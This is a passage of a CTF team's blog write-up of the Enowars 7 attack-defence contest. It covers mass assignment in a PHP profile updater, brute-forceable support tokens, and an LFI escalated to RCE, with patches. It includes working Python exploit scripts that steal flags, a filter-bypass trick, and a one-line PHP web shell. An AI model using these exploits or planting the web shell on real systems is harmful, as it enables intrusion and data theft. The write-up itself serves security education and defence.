		<span class="n">chatroom</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:3000/chatroom/</span><span class="si">{</span><span class="n">roomid</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>

		<span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">'ENO[A-Za-z0-9+/=]{48}'</span><span class="p">)</span>
		<span class="n">flags</span> <span class="o">=</span> <span class="n">flag_regex</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">chatroom</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="nb">set</span><span class="p">(</span><span class="n">flags</span><span class="p">):</span>
			<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</pre></table></code></div></div><h1 id="oldschool---mass-assignment">OldSchool - Mass Assignment</h1><p>For the Oldschool service we were able to update our user profile.</p><p>Here is the function:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">updateProfile</span><span class="p">(</span><span class="nv">$userId</span><span class="p">,</span> <span class="nv">$profileData</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$dbh</span> <span class="o">=</span> <span class="no">DB</span><span class="o">::</span><span class="nf">getInstance</span><span class="p">();</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'UPDATE users SET '</span><span class="p">;</span>
    <span class="nv">$params</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$first</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$profileData</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$first</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">', '</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$first</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$key</span> <span class="mf">.</span> <span class="s1">' = :'</span> <span class="mf">.</span> <span class="nv">$key</span><span class="p">;</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s1">':'</span> <span class="mf">.</span> <span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">' WHERE id = :userId'</span><span class="p">;</span>
    <span class="nv">$params</span><span class="p">[</span><span class="s1">':userId'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$userId</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">':password'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">':password'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s1">':password'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">password_hash</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">':password'</span><span class="p">],</span> <span class="no">PASSWORD_DEFAULT</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When the function is called it gets passed the full $_POST array:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">updateProfile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">][</span><span class="s1">'id'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">);</span>
</pre></table></code></div></div><p>There is of course an SQLi in this function but it was easier to exploit the mass assignment for the same flag. The mass assignment is also harder to patch.</p><p>Mass assignment vulnerabilities occurs when an application allows us to specify what fields to update without any constraints - in this case admin_of is something we shouldnt be allowed to change. To exploit this we register an account, submit a post request with <code class="language-plaintext highlighter-rouge">admin_of=123</code> where 123 is given to use in the attack json. Then we can view the profile of the user given in the attack json which has a flag for us to take.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span>

<span class="c1">#script,ip = argv
</span><span class="n">ip</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_IP'</span><span class="p">)</span>
<span class="n">extra</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'TARGET_EXTRA'</span><span class="p">))</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'User-Agent'</span><span class="p">:</span><span class="s">'python-httpx/0.23.3'</span><span class="p">}</span> <span class="c1"># user agent of the flag checker (afaik)
</span><span class="n">flag_regex</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">'ENO[A-Za-z0-9+/=]{48}'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">rand_string</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
	<span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>

<span class="n">username</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">rand_string</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>

<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=register"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">},</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">extra</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
	<span class="n">extra_txt</span> <span class="o">=</span> <span class="n">extra</span><span class="p">[</span><span class="n">x</span><span class="p">][</span><span class="s">'0'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">course_id</span> <span class="o">=</span> <span class="n">extra_txt</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
	<span class="n">user_id</span> <span class="o">=</span> <span class="n">extra_txt</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
	<span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"aDmIn_oF"</span><span class="p">:</span><span class="n">course_id</span><span class="p">})</span> <span class="c1"># mixed case to bypass weak filters
</span>	<span class="n">page</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:9080/index.php?action=profile&amp;id=</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>
	<span class="n">flags</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">flag_regex</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
	<span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><h1 id="bollwerk">Bollwerk</h1><h1 id="vuln-1---bruteforcable-tokens">Vuln 1 - Bruteforcable Tokens</h1><p>The first vuln we found was with how the app handles support tickets/complaints. When creating a complaint, its stored through a b64 token of your username, ‘_’ for padding and the first 8 chars of uniqid()</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">#app/Controller/SupportController.php:38</span>
	<span class="k">private</span> <span class="k">function</span> <span class="n">generateToken</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$username</span><span class="p">):</span> <span class="kt">string</span>
	<span class="p">{</span>
	<span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%-'_21s%.8s"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nb">uniqid</span><span class="p">()));</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>Uniqid reutrns a “<em>unique</em>” identifier based on the current time in microseconds. But since its only using the first 8 bytes. It’s not that unique, with only the last 1 or 2 bytes being different. So you can brute force the ID with relative ease.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%.8s"</span><span class="p">,</span>  <span class="nb">uniqid</span><span class="p">());</span>
<span class="c1"># 64c1709e</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%.8s"</span><span class="p">,</span>  <span class="nb">uniqid</span><span class="p">());</span>
<span class="c1"># 64c1709f</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%.8s"</span><span class="p">,</span>  <span class="nb">uniqid</span><span class="p">());</span>
<span class="c1"># 64c170a0</span>
</pre></table></code></div></div><p>Looking at <code class="language-plaintext highlighter-rouge">/support-disclaimer</code> of the web app will reveal all current complains. This includes the username and the time that the complaint was made. Using the two of these you can quickly generate the valid tokens and get the flag.</p><h3 id="patch"><span class="mr-2">Patch</span><a href="#patch" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Our patch for this was to just replace uniqid with random_bytes() so the bytes are actually unique.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">#app/Controller/SupportController.php:38</span>
<span class="k">private</span> <span class="k">function</span> <span class="n">generateToken</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$username</span><span class="p">):</span> <span class="kt">string</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%-'_21s%.8s"</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span> <span class="p">));</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>We also stripped the submission date from the <code class="language-plaintext highlighter-rouge">/support-disclaimer</code> page to make getting the exact submission time harder to get.</p><h1 id="vuln-2---lfi">Vuln 2 - LFI</h1><p>The second vuln found was intended as LFI by calling on the $viewPath variable, but we were able to get RCE.</p><p>$viewPath is inside the function <strong>render</strong> which is used to render a view file and return its contents as a response object. When the $viewPath variable is used in your request, the contents of the file being viewed and <em>can be rendered</em>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c1">#app/Http/View.php:18</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">render</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$view</span><span class="p">,</span> <span class="kt">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[]):</span> <span class="kt">Response</span>
    <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nv">$viewPath</span> <span class="o">=</span> <span class="s2">"View/</span><span class="nv">$view</span><span class="s2">.php"</span><span class="p">;</span>
        <span class="nb">extract</span><span class="p">([</span><span class="mf">...</span><span class="k">static</span><span class="o">::</span><span class="nf">createGlobals</span><span class="p">(),</span> <span class="mf">...</span><span class="nv">$parameters</span><span class="p">]);</span>
        <span class="k">require</span><span class="p">(</span><span class="nf">resolvePath</span><span class="p">(</span><span class="nv">$viewPath</span><span class="p">));</span>
        <span class="k">return</span> <span class="nc">Response</span><span class="o">::</span><span class="nf">create</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nb">ob_get_clean</span><span class="p">());</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">resolvePath</code> function is used to get the path of the file to be rendered. However, its limited to these directories</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">const</span> <span class="no">ALLOW_LIST</span> <span class="o">=</span> <span class="p">[</span>
<span class="s1">'files'</span><span class="p">,</span>
<span class="s1">'public'</span><span class="p">,</span>
<span class="s1">'View'</span><span class="p">,</span>
<span class="p">];</span>
</pre></table></code></div></div><p>With all of this, we can now view any files that are in the directories listed in ALLOW_LIST. We know that when a user creates a recipe, the file is stored in a directory that is the md5 hash of the users username.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">createRecipe</span><span class="p">(</span><span class="kt">array</span> <span class="nv">$data</span><span class="p">):</span> <span class="kt">Recipe</span>
<span class="p">{</span>
<span class="nv">$directory</span> <span class="o">=</span> <span class="nf">resolvePath</span><span class="p">(</span><span class="s1">'files/'</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">session</span><span class="o">-&gt;</span><span class="nf">getUser</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">),</span> <span class="n">checkFileExistence</span><span class="o">:</span> <span class="kc">false</span><span class="p">);</span>
<span class="mf">...</span>
</pre></table></code></div></div><p>The attack.json file gives us both the username and recipe title for all the flags for the tick. So we can then view any files by sending viewPath=files/<code class="language-plaintext highlighter-rouge">{MD5 of username}</code>/<code class="language-plaintext highlighter-rouge">{filename}.md</code> as a cookie in a GET request.</p><h3 id="rce"><span class="mr-2">RCE</span><a href="#rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>From looking in the tulip logs we seen that one team was able to load their own recipes with PHP code in order to get RCE. We were able to replicate it by creating a recipe with this as the recipes description</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'rce'</span><span class="p">]);</span><span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Once we called our recipe, we can give a url parameter <code class="language-plaintext highlighter-rouge">?rce=grep+-ERho+'ENO%5BA-Za-z0-9+%5C/=%5D%7B48%7D'+/var/www/html/files</code> to read all files matching the flag regex.</p><h3 id="patch-1"><span class="mr-2">Patch</span><a href="#patch-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Our patch for this was fairly simple. We just added a salt of ‘irelandwithoutre’ to the md5 of the username for the directory name. ```php public function createRecipe(array $data): Recipe</p><p>{</p><p>$directory = resolvePath(‘files/’ . md5($this-&gt;request-&gt;session-&gt;getUser()-&gt;username . ‘irelandwithoutre’), checkFileExistence: false); …</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/attack-defence/'>Attack-Defence</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/attack-defence/" class="post-tag no-text-decoration" >attack-defence</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Enowars 7 - Ireland.RE&amp;url=https://ireland.re/posts/Enowars7/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Enowars 7 - Ireland.RE&amp;u=https://ireland.re/posts/Enowars7/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/Enowars7/&amp;text=Enowars 7 - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/TheFewChosen_2023/">TheFewChosen 2023</a><li><a href="/posts/Enowars7/">Enowars 7</a><li><a href="/posts/AmateursCTF/">AmateursCTF 2023</a><li><a href="/posts/Lexington_Informatics_Tournament_CTF_23/">Lexington Informatics Tournament CTF 2023</a><li><a href="/posts/HITB_Phuket_2023/">HITB Phuket 2023</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/AmateursCTF/"><div class="card-body"> <em class="timeago small" data-ts="1689811200" > 2023-07-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AmateursCTF 2023</h3><div class="text-muted small"><p> cps remastered The description is already hinting at SQL injection so we know what we’re getting into here It didnt take too long to spot the SQLi in register.php &amp;lt;?php $message = &quot;&quot;; ...</p></div></div></a></div><div class="card"> <a href="/posts/TheFewChosen_2023/"><div class="card-body"> <em class="timeago small" data-ts="1690675200" > 2023-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheFewChosen 2023</h3><div class="text-muted small"><p> Crypto Dizzy We’re given this to decipher: 1 T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 T...</p></div></div></a></div><div class="card"> <a href="/posts/Lexington_Informatics_Tournament_CTF_23/"><div class="card-body"> <em class="timeago small" data-ts="1691452800" > 2023-08-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lexington Informatics Tournament CTF 2023</h3><div class="text-muted small"><p> Pwn My Pet Canary’s Birthday Pie Here is my first c program! I’ve heard about lots of security features in c, whatever they do. The point is, c looks like a very secure language to me! Try breaki...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/AmateursCTF/" class="btn btn-outline-primary" prompt="Older"><p>AmateursCTF 2023</p></a> <a href="/posts/TheFewChosen_2023/" class="btn btn-outline-primary" prompt="Newer"><p>TheFewChosen 2023</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
